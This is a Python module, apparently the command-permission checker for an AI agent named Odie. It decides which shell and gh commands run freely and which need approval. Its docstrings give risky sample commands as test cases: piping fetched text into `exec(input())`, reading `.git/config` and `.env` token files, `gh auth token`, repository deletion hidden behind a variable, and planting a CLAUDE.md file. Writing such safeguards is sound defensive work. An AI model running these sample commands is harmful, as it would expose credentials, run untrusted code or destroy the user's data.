def _plain_node(program: str) -> bool:
    """plain_program's node half: require only of fs, none of fs's writes (process.stdout.write aside), and of
    process only stdin, stdout, argv and exit.
      "require('fs').readFileSync(0,'utf8')" -> True;  "require('net')" -> False;  "require(x)" -> False;
      "require('fs').writeFileSync(p, d)" -> False;  "process.env" -> False;  "process.stdout.write(s)" -> True."""
    if len(_JS_REQUIRE.findall(program)) != len(_JS_PLAIN_REQUIRE.findall(program)):
        return False
    if _JS_PROCESS.search(program):
        return False
    return _JS_CHANGES_FILES.search(program.replace("process.stdout.write", "")) is None


def shadows_pythons_modules(folder: str | None) -> bool:
    """Whether python3 started in this folder could import a file there instead of its own module: python3 -c looks
    in the folder it runs in first, so a json.py (or json/, json.pyc, json.so) there runs instead of the real json.
    A folder the text can't name counts as one that does. "/h/work/proj" holding json.py -> True; holding notes.md
    -> False; None -> True."""
    if folder is None:
        return True
    try:
        entries = os.listdir(folder)
    except OSError:
        return True
    for entry in entries:
        stem = entry.split(".", 1)[0]
        is_code = entry.endswith((".py", ".pyc", ".so")) or os.path.isdir(os.path.join(folder, entry))
        if is_code and stem in sys.stdlib_module_names:
            return True
    return False


def writes_a_python_module(shell: str) -> bool:
    """Whether the command itself may write a file Python would import instead of its own (the folder is listed
    before the command runs, so shadows_pythons_modules can't see it): a redirect, copy, move, link or download whose
    name is a standard module's (json.py, re.pyc, csv/), or a download or unpack into a folder under names the command
    doesn't show (curl -O, wget, tar, unzip, git clone).
      `cat > json.py <<'EOF'` -> True;  `curl -o re.py U` -> True;  `curl -sO U` -> True;  `echo hi > notes.md` -> False."""
    for start, end in piece_spans(shell):
        piece = shell[start:end]
        targets = [shell_word(r.group(3).removeprefix("&")) or "" for r in _REDIRECT.finditer(piece)]
        try:
            words = shlex.split(piece)
        except ValueError:
            return True
        for name, how in written_paths(words):
            if how == "folder":
                return True
            targets.append(name)
        for target in targets:
            stem = os.path.basename(target.rstrip("/")).split(".", 1)[0]
            if stem in sys.stdlib_module_names:
                return True
    return False


def smart_blanked(shell: str, shell_read: str, code: str, cwd: str | None = None) -> str:
    """Smart's rules 2 and 3 applied to the text the rules read (`shell_read`, the same length as `shell`): a pipe into
    a plain program written in the command (plain_program) becomes a `;` (it carries data, not commands; the program
    itself is still read by every rule), and find's own -prune is blanked (it skips a folder; it deletes nothing).
    The pipe stays a pipe when the command sets a variable (sets_variables: PYTHONINSPECT, NODE_OPTIONS …), writes a
    file Python could import instead of its own (writes_a_python_module), or, for python, when its folder already holds
    one (shadows_pythons_modules).
      `curl -s u | python3 -c 'import json,sys; print(json.load(sys.stdin))'` -> the | becomes ;
      `curl -s u | python3 -c 'exec(input())'` -> unchanged;  `export PYTHONINSPECT=1; curl u | python3 -c 'pass'` ->
      unchanged;  `find . -path ./x -prune -o -print` -> -prune blanked;  `git fetch --prune` -> unchanged."""
    contexts = char_contexts(shell)
    out = list(shell_read)
    folder_at = {start: here for start, _end, here in piece_folders(shell, cwd)}
    variables_set = sets_variables(shell) or writes_a_python_module(shell)  # either: no pipe into a program is plain
    for pipe in _PIPE_INTO_PROGRAM.finditer(shell):
        language = "python"
        program = pipe.group(1)
        if program is None:
            language = "node"
            program = pipe.group(2)
        if _opens_a_plain_program(contexts, pipe.start(), program, language, variables_set, folder_at):
            out[pipe.start()] = ";"
    for pipe in _PIPE_INTO_HEREDOC.finditer(shell):
        language = "node" if pipe.group(1) == "node" else "python"
        if _opens_a_plain_program(contexts, pipe.start(), code, language, variables_set, folder_at):
            out[pipe.start()] = ";"
    for start, end in piece_spans(shell):
        words = plain_words(shell[start:end])
        if not words or words[0] != "find":
            continue
        for prune in re.finditer(r"(?<=\s)-prune(?=\s|$)", shell[start:end]):
            at = start + prune.start()
            if contexts[at] == "plain":
                out[at:at + len("-prune")] = " " * len("-prune")
    return "".join(out)


def _opens_a_plain_program(contexts: list[str], pipe_at: int, program: str, language: str, variables_set: bool,
                           folder_at: dict[int, str | None]) -> bool:
    """smart_blanked's decision for one pipe: an unquoted |, a plain program, no variable set, and for python a folder
    with nothing that shadows its modules. `| python3 -c 'import json'` in ~/work/notes -> True; the same with a json.py
    there -> False; `| node -e 'eval(x)'` -> False."""
    if contexts[pipe_at] != "plain" or variables_set:
        return False
    if not plain_program(program, language):
        return False
    shadowed = language == "python" and shadows_pythons_modules(folder_at.get(pipe_at + 1))
    return not shadowed


def _blank_pieces(shell: str, text: str, keep: Callable[[list[str]], bool]) -> str:
    """`text` (as long as `shell`) with each simple command of `shell` that `keep` passes blanked out."""
    out = list(text)
    for start, end in piece_spans(shell):
        words = plain_words(shell[start:end])
        if words and keep(words):
            out[start:end] = " " * (end - start)
    return "".join(out)


def smart_views(shell: str, shell_read: str, own_port: int | None) -> dict[str, str]:
    """What some rules read in Smart instead of the whole text: the "runs later" rule doesn't see the commands that
    only read what runs at login (is_login_reader: `launchctl list`, `crontab -l`, `plutil -p`, `cat` of a plist), the
    "deletes" rule doesn't see `launchctl list|print` or `crontab -l` (launchctl and crontab are its words), and the
    "sends data out" rule doesn't see a send to this computer (is_local_send), unless the command sets a variable
    or names a config (sets_variables: a proxy could take it elsewhere). Every other rule reads it all.
      `launchctl list | grep x` -> both login rules read "              | grep x";  `echo rm x` -> unchanged;
      `curl -X POST http://localhost:9000/x -d 1` -> "sends data out" reads blanks."""
    login_blanked = _blank_pieces(shell, shell_read, is_login_reader)
    listings_blanked = _blank_pieces(shell, shell_read, lambda words: words[0] in ("launchctl", "crontab")
                                     and is_login_reader(words))
    sends_blanked = shell_read
    if not sets_variables(shell):
        sends_blanked = _blank_pieces(shell, shell_read, lambda words: is_local_send(words, own_port))
    return {"deletes or stops something": listings_blanked, "sets something to run later or at login": login_blanked,
            "sends data out": sends_blanked}


# ── where each command runs, and where it writes (17 Nov 2026 review) ───────────────────────────────────────────────

_FOLDER_MOVES = ("cd", "pushd", "popd")


def _moved_to(piece: str, here: str | None) -> str | None:
    """The folder after a cd / pushd / popd piece, or None when the text can't say: `cd ~/work` -> the home + /work;
    `cd` -> the home; `cd -`, `popd`, `pushd` alone, `cd $X`, `cd a b` -> None; a relative cd from an unknown folder ->
    None."""
    contexts = char_contexts(piece)
    for i, char in enumerate(piece):
        filled_in = char == "`" or (char == "$" and not _HOME_VARIABLE.match(piece, i))
        if contexts[i] in ("plain", "double") and filled_in:
            return None  # a folder made at run time
        if contexts[i] == "plain" and char in "*?[]{}()<>&":
            return None  # a pattern, or more than a move
    try:
        words = shlex.split(piece)
    except ValueError:
        return None
    if not words:
        return None
    tool = words[0]
    args = words[1:]
    if tool == "popd":
        return None
    if not args:
        if tool == "cd":
            return os.path.realpath(os.path.expanduser("~"))
        return None
    if len(args) > 1 or args[0] == "-":
        return None
    return _resolved(args[0], here)


def piece_folders(shell: str, cwd: str | None) -> list[tuple[int, int, str | None]]:
    """Each simple command of the shell text (piece_spans) with the folder it runs in: the given cwd (or the home,
    where run_shell starts), then each cd, pushd or popd. None from the first move the text can't follow: `cd -`,
    `popd`, `cd $X`, or any move inside a subshell or a { } group (it ends at the closing bracket, which the reading
    here doesn't track).
      ("cd /tmp; ls", None) -> [(0, 7, <home>), (8, 11, "/private/tmp")];  ("popd; ls", "/h/w") -> [(…, "/h/w"),
      (…, None)];  ("(cd ~/a); echo > x", None) -> the echo runs in None."""
    here: str | None = os.path.realpath(os.path.expanduser(cwd or "~"))
    out = []
    for start, end in piece_spans(shell):
        piece = shell[start:end]
        out.append((start, end, here))
        stripped = piece.strip()
        first_word = stripped.lstrip("({ ").split(maxsplit=1)[:1]
        if not first_word or first_word[0] not in _FOLDER_MOVES:
            continue
        if stripped.startswith(("(", "{")):
            here = None  # a move inside a subshell or group: after it, the text can't say where it is
            continue
        here = _moved_to(stripped, here)
    return out


_LOGIN_FOLDERS = frozenset({"launchagents", "launchdaemons", "startupitems"})
RUN_LATER = "sets something to run later or at login"


def where_it_lands(path: str, safe_dirs: tuple[str, ...], odie_dirs: tuple[str, ...]) -> str | None:
    """Why anything written at this path asks, whatever command writes it, or None. Judged on the path as given and
    with links followed (both are passed in turn by the caller), case ignored:
      a safe place (/tmp, the workspace, the vault, not their hidden folders) -> None;
      inside LaunchAgents, LaunchDaemons or StartupItems -> "sets something to run later or at login";
      outside the home (a system path), in a hidden folder under it, in ~/Library, or in Odie's own folders ->
      "writes a file outside /tmp";  "/h/work/proj/a.txt" -> None."""
    if is_safe_place(path, safe_dirs):
        return None
    folded = path.lower()
    if any(part in _LOGIN_FOLDERS for part in folded.split("/")):
        return RUN_LATER
    home = os.path.realpath(os.path.expanduser("~"))
    parts = _parts_under(folded, home.lower())
    if parts is None:
        parts = _parts_under(folded, os.path.normpath(os.path.expanduser("~")).lower())
    if parts is None:
        return OUTSIDE
    if any(part.startswith(".") for part in parts):
        return OUTSIDE
    if parts and parts[0] == "library":
        return OUTSIDE
    for place in odie_dirs:
        if _inside(path, os.path.realpath(os.path.expanduser(place))):
            return OUTSIDE
    return None


_COPIERS = frozenset({"cp", "mv", "ln", "install", "rsync", "ditto", "gcp", "gmv"})
_CURL_WRITES = frozenset({"-o", "--output", "-D", "--dump-header", "-c", "--cookie-jar", "--trace", "--trace-ascii",
                          "--alt-svc", "--hsts", "--etag-save", "--libcurl", "--stderr"})
_CURL_TO_FOLDER = frozenset({"-O", "--remote-name", "--remote-name-all", "-J", "--remote-header-name"})
_WGET_WRITES = frozenset({"-O", "--output-document", "-o", "--output-file", "-a", "--append-output",
                          "--save-cookies"})


def _option_value(args: list[str], at: int) -> tuple[str, str | None, int]:
    """An option at args[at] and its value: ("--output-dir=x" …) -> ("--output-dir", "x", at + 1);
    ("-o", "f" …) -> ("-o", "f", at + 2); ("-sSo", "f") -> ("-o", "f", at + 2) (curl's joined letters, the last one
    taking the value); ("-ofile") -> ("-o", "file", at + 1)."""
    word = args[at]
    if word.startswith("--"):
        if "=" in word:
            name, value = word.split("=", 1)
            return name, value, at + 1
        following = args[at + 1] if at + 1 < len(args) else None
        return word, following, at + 2
    letters = word[1:]
    name = "-" + letters[-1:]
    for index, letter in enumerate(letters):
        if letter in "oODc":
            name = "-" + letter
            rest = letters[index + 1:]
            if rest:
                return name, rest, at + 1
            break
    following = args[at + 1] if at + 1 < len(args) else None
    return name, following, at + 2


def written_paths(words: list[str]) -> list[tuple[str, str]]:
    """Where one simple command writes besides a redirect, each as (path, how): "file" (a file it makes or changes),
    "replaces" (a file it overwrites when there: curl -o, wget -O) or "folder" (it writes something into that folder).
      ["cp", "a", "~/.config/b"] -> [("~/.config/b", "file")];  ["cp", "-t", "~/.config", "a"] -> [("~/.config",
      "folder")];  ["ln", "-s", "~/x"] -> [(".", "folder")];  ["curl", "-s", "U", "-o", "f"] -> [("f", "replaces")];
      ["curl", "-O", "U"] -> [(".", "folder")];  ["wget", "U"] -> [(".", "folder")];  ["tee", "a"] -> [("a", "file")];
      ["dd", "of=x"] -> [("x", "file")];  ["ls"] -> []."""
    if not words:
        return []
    tool = words[0]
    args = words[1:]
    plain = [a for a in args if not a.startswith("-")]
    out: list[tuple[str, str]] = []
    if tool in _COPIERS:
        for at, word in enumerate(args):
            if word in ("-t", "--target-directory") and at + 1 < len(args):
                return [(args[at + 1], "folder")]
            if word.startswith("--target-directory="):
                return [(word.split("=", 1)[1], "folder")]
            if word.startswith("-t") and not word.startswith("--") and len(word) > 2:
                return [(word[2:], "folder")]
        if tool == "ln" and len(plain) == 1:
            return [(".", "folder")]
        if len(plain) >= 2:
            return [(plain[-1], "file")]
        return []
    if tool in ("tee", "touch", "mkdir", "truncate"):
        return [(a, "file") for a in plain]
    if tool == "dd":
        return [(a[3:], "file") for a in args if a.startswith("of=")]
    if tool == "curl":
        return _curl_writes(args)
    if tool == "wget":
        return _wget_writes(args)
    if tool in ("tar", "bsdtar", "unzip"):
        for at, word in enumerate(args):
            if word in ("-C", "-d", "--directory") and at + 1 < len(args):
                return [(args[at + 1], "folder")]
        return [(".", "folder")]
    if tool == "git" and args[:1] == ["clone"]:
        targets = [a for a in args[1:] if not a.startswith("-")]
        if len(targets) >= 2:
            return [(targets[-1], "folder")]
        return [(".", "folder")]
    return out


def _curl_writes(args: list[str]) -> list[tuple[str, str]]:
    """curl's files: -o and the other files it writes (a header dump, a cookie jar, a trace …), and -O / -J into
    --output-dir or the folder it runs in. ["-s", "-o", "f", "U"] -> [("f", "replaces")]; ["-O", "U"] -> [(".",
    "folder")]; ["-o", "-", "U"] -> [] (the screen)."""
    out = []
    folder = "."
    into_folder = False
    at = 0
    while at < len(args):
        word = args[at]
        if not word.startswith("-") or word == "-":
            at += 1
            continue
        if word in _CURL_TO_FOLDER or (not word.startswith("--") and ("O" in word[1:] or "J" in word[1:])):
            into_folder = True
        name, value, next_at = _option_value(args, at)
        if name == "--output-dir" and value is not None:
            folder = value
            at = next_at
            continue
        if name in _CURL_WRITES and value is not None:
            if value not in ("-", "/dev/null"):
                out.append((value, "replaces"))
            at = next_at
            continue
        at += 1
    if into_folder:
        out.append((folder, "folder"))
    return out


def _wget_writes(args: list[str]) -> list[tuple[str, str]]:
    """wget's files: -O (overwritten when there), its log, and otherwise a new file in -P or the folder it runs in.
    ["-O", "f", "U"] -> [("f", "replaces")]; ["U"] -> [(".", "folder")]; ["-P", "d", "U"] -> [("d", "folder")];
    ["-O", "-", "U"] -> []."""
    out = []
    folder = "."
    named = False
    at = 0
    while at < len(args):
        word = args[at]
        if not word.startswith("-") or word == "-":
            at += 1
            continue
        name, value, next_at = _option_value(args, at)
        if name in ("-P", "--directory-prefix") and value is not None:
            folder = value
            at = next_at
            continue
        if name in _WGET_WRITES and value is not None:
            if name in ("-O", "--output-document"):
                named = True
            if value not in ("-", "/dev/null"):
                out.append((value, "replaces"))
            at = next_at
            continue
        at += 1
    if not named:
        out.append((folder, "folder"))
    return out


def destination_reason(shell: str, cwd: str | None, safe_dirs: tuple[str, ...],
                       odie_dirs: tuple[str, ...]) -> str | None:
    """Why a command's copies, moves, links and downloads need a tap, read in every mode: where they land
    (where_it_lands, as written and with links followed), a download that overwrites a file that is there ("replaces a
    file"), and anything but a plain login reader run inside a login-items folder (the cwd, or after a cd). Each simple
    command is read in the folder it runs in (piece_folders); a relative path in a folder the text can't name asks.
      `cp a.txt ~/.config/git/config` -> "writes a file outside /tmp";  `cd ~/Library/LaunchAgents && cp ~/x.plist .`
      -> "sets something to run later or at login";  `curl -s U -o ~/work/old.md` (there) -> "replaces a file";
      `cp a.md ~/work/proj/` -> None;  cwd LaunchAgents, `ls` -> None."""
    homes = (os.path.realpath(os.path.expanduser("~")),)
    for start, end, here in piece_folders(shell, cwd):
        piece = shell[start:end]
        words = plain_words(piece)
        if words is None:
            try:
                words = shlex.split(piece)
            except ValueError:
                words = []
        in_login_folder = here is not None and any(part in _LOGIN_FOLDERS for part in here.lower().split("/"))
        changes_it = bool(words) and words[0] not in _FOLDER_MOVES and not is_login_reader(words)
        if in_login_folder and changes_it:
            return RUN_LATER  # cwd LaunchAgents, `cp ~/x.plist com.x.plist`: whatever the verb
        for name, how in written_paths(words):
            if how != "folder" and read_as_instructions(name):
                return OUTSIDE  # cp notes.md ~/vault/CLAUDE.md: its new name is read as orders
            target = name
            if how == "folder":
                target = os.path.join(name, "a-new-file")
            path = _resolved(target, here)
            if path is None:
                return OUTSIDE
            spelled = _spelled(target, here or homes[0])
            for candidate in (spelled, path):
                why = where_it_lands(candidate, safe_dirs, odie_dirs)
                if why is not None:
                    return why
            if how == "replaces" and not is_safe_place(path, safe_dirs) and os.path.lexists(spelled):
                return REPLACES
    return None


def _spelled(name: str, here: str) -> str:
    """A path as written, ~ and $HOME made the home, taken from `here` when relative, no links followed:
    ("~/a/../b", any) -> <home>/b; ("x", "/h/w") -> "/h/w/x"."""
    spelled = os.path.expanduser(_LEADING_HOME.sub("~", name))
    return os.path.normpath(os.path.join(here, spelled))


def names_odie_home_by_path(shell: str, cwd: str | None, safe_dirs: tuple[str, ...],
                            odie_dirs: tuple[str, ...]) -> bool:
    """Whether a command reaches Odie's own folders by where it runs or the paths it names, links followed and case
    ignored, outside the workspace and the safe places. The words of the rules can't see a link: `cat ~/work/o/mcp.json`
    where ~/work/o links to ~/.odie -> True; a command run in ~/.ODIE -> True; `ls ~/.odie/data/workspace` -> False;
    `cat ~/work/notes/a.md` -> False."""
    homes = [os.path.realpath(os.path.expanduser(os.environ.get("ODIE_HOME") or "~/.odie"))]
    homes += [os.path.realpath(os.path.expanduser(place)) for place in odie_dirs]
    allowed = [os.path.realpath(os.path.expanduser(place)) for place in safe_dirs]
    for odie_home in homes:
        allowed += [os.path.join(odie_home, "workspace"), os.path.join(odie_home, "data", "workspace")]

    def is_odies(path: str) -> bool:
        # inside one of Odie's folders but not a place it may use: <home>/.odie/mcp.json -> True; its workspace -> False
        return any(_inside(path, h) for h in homes) and not any(_inside(path, a) for a in allowed)

    home = os.path.realpath(os.path.expanduser("~"))
    for start, end, here in piece_folders(shell, cwd):
        if here is not None and is_odies(here):
            return True
        piece = shell[start:end]
        words = plain_words(piece)
        if words is None:
            try:
                words = shlex.split(piece)
            except ValueError:
                continue
        for word in words[1:]:
            if "/" not in word or word.startswith("-"):
                continue
            path = _resolved(word, here)
            if path is None:
                path = _expanded(word, home)
            if is_odies(path):
                return True
    return False


# Odie's code checkout as a command names it: ~/.odie/app, $ODIE_HOME/app, ${ODIE_HOME}/app, as a whole folder name.
_ODIE_CODE = re.compile(r"(\.odie|\$?\{ODIE_HOME\}|\$?ODIE_HOME)/app(?=$|[/\s'\";&|)])")


def _odie_home_paths() -> tuple[str, str]:
    """Odie's home and its code checkout, links followed: ($ODIE_HOME or ~/.odie, the same + /app)."""
    home = os.path.realpath(os.path.expanduser(os.environ.get("ODIE_HOME") or "~/.odie"))
    return home, os.path.join(home, "app")




def reads_only_odies_code(shell: str, code: str, cwd: str | None) -> bool:
    """Smart's rule 1: whether a command's only touch on Odie's home is reading its code checkout (~/.odie/app, also
    $ODIE_HOME/app). Every simple command must be a plain reader (is_plain_reader), nothing may climb with `..`, no
    inline code, no other part of Odie's home named, and every path it names, links followed, must stay in the checkout
    or outside Odie's home, never in a hidden part of it. A recursive search may not start at the checkout itself (it
    would read .git) nor follow links (search_starts_plainly); a pattern may only pick plain files from a plain folder
    (glob_stays_plain). When unsure: False, and the command asks.
      `cd ~/.odie/app; grep -n x web/src/a.tsx | head` -> True;  `cd ~/.odie; sed -n 1,5p mcp.json` -> False;
      `cd ~/.odie/app; cat ../.env` -> False;  `cd ~/.odie/app; cat link-out` (a link to ../mcp.json) -> False;
      `cd ~/.odie/app; cat $X` -> False;  `echo x > ~/.odie/app/a.py` -> False (a write);
      `cat ~/.odie/app/.git/config` -> False (a hidden file);  `cd ~/.odie/app; grep -rn x .` -> False;
      `cd ~/.odie/app/odie; grep -n x app/*.py` -> True;  `cd ~/.odie/app; cat *` -> False (the folder holds .git)."""
    if code.strip():
        return False
    where = cwd or ""
    if ".." in shell or ".." in where:
        return False
    if _GLOB_OPTIONS.search(shell):
        return False  # setopt globdots and the like make a pattern pick hidden files
    for text in (shell, where):
        rest = _ODIE_CODE.sub(lambda m: " " * len(m.group(0)), text)
        if touches_odie_home(rest) or touches_odie_home(squeezed(rest)):
            return False
    odie_home, checkout = _odie_home_paths()
    for start, end, here in piece_folders(shell, cwd):
        if here is None:
            return False
        words = plain_words(shell[start:end], globs=True)
        if words is None:
            return False
        spelled = [w.replace(_ANY_RUN, "*").replace(_ANY_ONE, "?") for w in words]
        if not is_plain_reader(spelled) or not search_starts_plainly(spelled, here, checkout):
            return False
        named = [here]
        for word in words[1:]:
            if word.startswith(_FILTER_OPTIONS):
                continue  # grep's --include=*.py is a filter, not a path
            if _ANY_RUN in word or _ANY_ONE in word:
                if not glob_stays_plain(word, here, checkout):
                    return False
                continue
            named.append(_expanded(word, here))
        for path in named:
            if not _inside(path, odie_home):
                continue
            if not _inside(path, checkout):
                return False
            inside_checkout = _parts_under(path.lower(), checkout.lower()) or []
            if any(part.startswith(".") for part in inside_checkout):
                return False  # .git/config, a .env: hidden files there may hold a token
    return True


# Rule 1's patterns: an unquoted * or ? is kept as these marks by plain_words(globs=True), so a pattern is told apart
# from a quoted * (words given to the tool).
_ANY_RUN = "\x00"
_ANY_ONE = "\x01"
_FILTER_OPTIONS = ("--include=", "--exclude=", "--exclude-dir=", "--include-dir=")
_GLOB_OPTIONS = re.compile(r"\b(setopt|unsetopt|shopt)\b|\bset\s+[-+]o\b")


def glob_stays_plain(word: str, here: str, checkout: str) -> bool:
    """Whether a pattern in a rule-1 reader can only pick plain files of the checkout: * or ? only in its last part,
    which doesn't start with a dot and has no **, in a folder inside the checkout (not hidden) whose every entry is a
    plain one: none hidden (a zsh setting could make * pick them) and none a link (it could lead out).
      `app/*.py` in odie/, app/ holding main.py -> True;  `*` at the checkout's top (it holds .git) -> False;
      `*` in a folder holding a link to ~/.odie/.env -> False;  `*/main.py` -> False;  `.*` -> False."""
    folder_part, _, last = word.rpartition("/")
    if _ANY_RUN in folder_part or _ANY_ONE in folder_part:
        return False
    if last.startswith(".") or _ANY_RUN * 2 in last:
        return False
    folder = _expanded(folder_part or ".", here)
    if not _inside(folder, checkout):
        return False
    below = _parts_under(folder.lower(), checkout.lower()) or []
    if any(part.startswith(".") for part in below):
        return False
    try:
        entries = os.listdir(folder)
    except OSError:
        return False
    for entry in entries:
        if entry.startswith(".") or os.path.islink(os.path.join(folder, entry)):
            return False
    return True


_RECURSIVE_GREP = re.compile(r"^-[A-Za-z]*[rR]|^--recursive$|^--dereference-recursive$|^-d$|^--directories=recurse$")


def search_starts_plainly(words: list[str], here: str, checkout: str) -> bool:
    """Whether a search in the checkout stays out of its .git, its links and its hidden files: a recursive grep (or
    rg, which always recurses) must start below the checkout's top, in a folder with no hidden name anywhere below it
    (hidden_below), and must not follow links (grep -R, rg -L). Any other command -> True.
      ["grep", "-rn", "x", "odie"] in the checkout -> True;  ["grep", "-rn", "x", "."] -> False;  ["rg", "x"] (from the
      top) -> False;  ["grep", "-R", "x", "odie"] -> False;  ["rg", "-L", "x", "odie"] -> False;
      ["grep", "-rn", "x", "lib"] with lib/inner/.env.local -> False;
      ["grep", "-n", "x", "a.py"] -> True (not recursive)."""
    if not words:
        return True
    tool = words[0]
    args = words[1:]
    if tool in ("grep", "egrep", "fgrep"):
        if not any(_RECURSIVE_GREP.match(a) for a in args):
            return True
        if any(a == "--dereference-recursive" or (a.startswith("-") and not a.startswith("--") and "R" in a)
               for a in args):
            return False
    elif tool in ("rg", "ag"):
        if any(a in ("-L", "--follow") or (a.startswith("-") and not a.startswith("--") and "L" in a) for a in args):
            return False
    else:
        return True
    plain = [a for a in args if not a.startswith("-")]
    given_pattern = any(a in ("-e", "-f", "--regexp", "--file") or a.startswith(("--regexp=", "--file="))
                        for a in args)
    starts = plain if given_pattern else plain[1:]
    if not starts:
        starts = ["."]
    for start in starts:
        globbed = "*" in start or "?" in start  # rule 1 hands the words over spelled back, marks made * and ?
        if globbed:
            start = start.rpartition("/")[0] or "."  # a pattern's folder: the search may start anywhere in it
        path = _expanded(start, here)
        if not _inside(path, checkout):
            continue
        if not (_parts_under(path.lower(), checkout.lower()) or []):
            return False  # the checkout's top: the search would read .git
        if hidden_below(path):
            return False
    return True


_WALK_LIMIT = 5000


def hidden_below(folder: str) -> bool:
    """Whether a recursive search starting at this folder could read a hidden file: any name starting with a dot
    anywhere below it (links aren't followed, as grep -r and rg don't). Read from names only; past _WALK_LIMIT names it
    counts as yes. odie/ with only .py files -> False;  lib/ holding inner/.env.local -> True;  a plain file -> False
    (only its own name was checked by the caller)."""
    if not os.path.isdir(folder):
        return False
    seen = 0
    for _root, folders, files in os.walk(folder):
        for name in (*folders, *files):
            seen += 1
            if name.startswith(".") or seen > _WALK_LIMIT:
                return True
    return False


# ── GitHub's gh, Odie's own command, and a command named at run time (18 Nov 2026) ──────────────────────────────────
# Smart let `gh repo delete`, `gh pr merge --admin`, `gh api -X DELETE …` and `gh auth token` run with no card, and
# `odie chat …` from Odie's own shell could drive Odie's chat. Under gh only plainly read-only use runs free now; the rest
# asks as sending out (and as deleting too for its delete kinds), and anything that shows or handles his GitHub
# credentials asks as reading secrets. Any `odie` command asks as Odie itself. A command whose name is filled in at run
# time (`G=gh; $G repo delete x`), or an alias that renames one, can't be read, so it asks as text run as commands.
# Each is read wherever the word stands, so `sh -c "…"`, `$(…)`, `xargs gh`, `env X=1 gh`, `command gh` and quoting
# tricks (read again squeezed) don't hide it.

READS_SECRETS = "reads secrets"
SENDS_OUT = "sends data out"
DELETES = "deletes or stops something"
SENDS_BUILT = "sends data out (an address built from other text)"
RUNS_TEXT = "runs text as commands"
RUNS_ODIE = "runs Odie itself (its own command)"

# gh as a word, by its name or a path to it (/opt/homebrew/bin/gh); not part of a longer name (ghostty, gh-pages).
_GH = re.compile(r"(?<![\w.@-])(?:[\w.~/-]*/)?gh(?=$|[\s;&|)`'\"<>])")
# Where one command ends: ; && || | & ) ` and line ends, but not the & of 2>&1 or &>, nor the | of >|.
_COMMAND_END = re.compile(r"&&|\|\||;|\n|(?<!>)\||(?<![>&|])&(?![>&])|\)|`")
# A redirect and its target (> f, 2>&1, >> "a b", < in.json, <<'EOF'): not words handed to the command.
_ANY_REDIRECT = re.compile(r"(\d*|&)(<<<|<<-?|<|>>|>)[&|]?\s*(?:'[^']*'|\"[^\"]*\"|[^\s;&|<>'\"])*")
# Text filled in at run time: $X, ${X}, $(…), `…` (but $HOME is the home).
_RUN_TIME_TEXT = re.compile(r"\$(?!HOME\b|\{HOME\})|`")
# jq's env and $ENV print every variable, a token among them: `gh pr view 3 --json title --jq 'env'`.
_JQ_ENV = re.compile(r"\benv\b|\$ENV\b")

GH_READS: dict[str, frozenset[str]] = {
    "pr": frozenset({"view", "list", "diff", "checks", "status"}),
    "issue": frozenset({"view", "list", "status"}),
    "repo": frozenset({"view", "list"}),
    "run": frozenset({"view", "list", "watch"}),
    "release": frozenset({"view", "list"}),
}
_GH_FREE_GROUPS = frozenset({"search", "browse"})  # search only reads; browse opens a page (it ran free before too)
_GH_HELP = frozenset({"help", "--help", "-h", "--version", "version"})
_GH_DELETE_WORDS = frozenset({"delete", "delete-asset", "close", "cancel", "archive", "remove", "logout", "lock"})
_GH_API_FLAGS = frozenset({"--paginate", "--slurp", "-i", "--include", "--silent", "--verbose"})
_GH_API_VALUES = frozenset({"-q", "--jq", "-t", "--template", "--cache", "-p", "--preview", "-X", "--method"})
_GH_AUTH_STATUS_FLAGS = frozenset({"-a", "--active"})
_GH_AUTH_STATUS_VALUES = frozenset({"-h", "--hostname"})


def gh_commands(text: str) -> list[list[str]]:
    """The words after each `gh` in the text, up to where that command ends (_COMMAND_END outside quotes), redirects
    left out; when the words can't be split as the shell would (a quote left open by `sh -c "…"`), its quotes are
    dropped and it is split at spaces, so it reads as more words, never fewer.
      `gh pr view 3 | head` -> [["pr", "view", "3"]];  `sh -c "gh repo delete x; ls"` -> [["repo", "delete", "x;",
      "ls"]];  `gh api repos/a/b > out.json` -> [["api", "repos/a/b"]];  `ls ~/work` -> []."""
    contexts = char_contexts(text)
    ansi_quotes = "$'" in text  # $'a\';' is one word to zsh, but its \' looks like a closing quote here: never cut
    found = []
    for gh in _GH.finditer(text):
        end = len(text)
        for cut in _COMMAND_END.finditer(text, gh.end()):
            if ansi_quotes:
                break
            if contexts[cut.start()] == "plain":
                end = cut.start()
                break
        rest = _ANY_REDIRECT.sub(" ", text[gh.end():end])
        try:
            words = shlex.split(rest)
        except ValueError:
            words = re.sub(r"['\"\\]", " ", rest).split()
        found.append(words)
    return found


def gh_reasons(args: list[str]) -> list[str]:
    """Why one gh command asks, from the words after `gh`; [] when it only reads. Free: `pr view|list|diff|checks|
    status`, `issue view|list|status`, `repo view|list`, `run view|list|watch`, `release view|list`, `search …`,
    `browse`, `api` as a plain GET (gh_api_reads_only), `auth status` without its token, help and version. Anything
    else asks as sending out, with deleting first for its delete kinds; `auth`, `secret` and `config` ask as reading
    secrets (gh_auth_reasons); words filled in at run time, or jq's env, ask too.
      ["pr", "view", "3"] -> [];  ["api", "repos/a/b"] -> [];  ["pr", "merge", "3", "--admin"] -> ["sends data out"];
      ["repo", "delete", "me/app", "--yes"] -> ["deletes or stops something", "sends data out"];
      ["api", "-X", "DELETE", "repos/a/b"] -> ["deletes or stops something", "sends data out"];
      ["auth", "token"] -> ["reads secrets"];  ["co", "3"] (an alias or extension) -> ["sends data out"];
      ["search", "code", "$(cat notes.md)"] -> ["sends data out (an address built from other text)"]."""
    if not args:
        return []  # bare gh prints its help
    group = args[0]
    action = ""
    if len(args) > 1:
        action = args[1]
    if group == "auth":
        reasons = gh_auth_reasons(args[1:])
    elif group in ("secret", "config"):
        reasons = [READS_SECRETS]  # `gh config get` can print a stored token
    elif gh_only_reads(group, action, args[1:]):
        reasons = []
    else:
        reasons = [SENDS_OUT]
        if group == "api":
            deletes = gh_api_method(args[1:]) == "DELETE"
        else:
            deletes = any(a in _GH_DELETE_WORDS for a in args[:3])
        if deletes:
            reasons.insert(0, DELETES)
    if not reasons and any(_JQ_ENV.search(a) for a in args):
        reasons = [READS_SECRETS]  # a read that prints every variable through jq
    if any(_RUN_TIME_TEXT.search(a) for a in args) and SENDS_BUILT not in reasons:
        reasons.append(SENDS_BUILT)
    return reasons


def gh_only_reads(group: str, action: str, rest: list[str]) -> bool:
    """Whether a gh command (its group, the word after it, and every word after the group) only reads: help or
    version, search or browse, a read action of its group (GH_READS), or a plain GET with `api`.
      ("pr", "view", ["view", "3"]) -> True;  ("search", "prs", […]) -> True;  ("api", "repos/a/b", ["repos/a/b"]) ->
      True;  ("pr", "merge", ["merge", "3"]) -> False;  ("api", "-X", ["-X", "POST", "x"]) -> False."""
